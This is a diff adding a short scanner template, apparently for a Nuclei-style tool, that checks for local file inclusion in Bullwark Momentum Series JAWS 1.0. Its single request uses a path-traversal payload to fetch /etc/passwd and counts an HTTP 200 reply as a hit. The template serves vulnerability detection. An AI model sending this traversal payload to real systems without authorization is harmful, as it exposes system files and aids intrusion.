@@ -1,0 +1,23 @@
+id: bullwark-momentum-lfi
+brief:
+    title: Bullwark Momentum Series JAWS 1.0 - Local File Inclusion
+    by: pikpikcu
+    level: high
+    about: Bullwark Momentum Series JAWS 1.0 is vulnerable to local file inclusion.
+    label:
+        - lfi
+        - edb
+        - bullwark
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/../../../../../../../../../../../../../etc/passwd'
+      head:
+        Referer: '{{Hostname}}'
+        X-Requested-With: XMLHttpRequest
+      signs:
+        - "on": status
+          status:
+            - 200
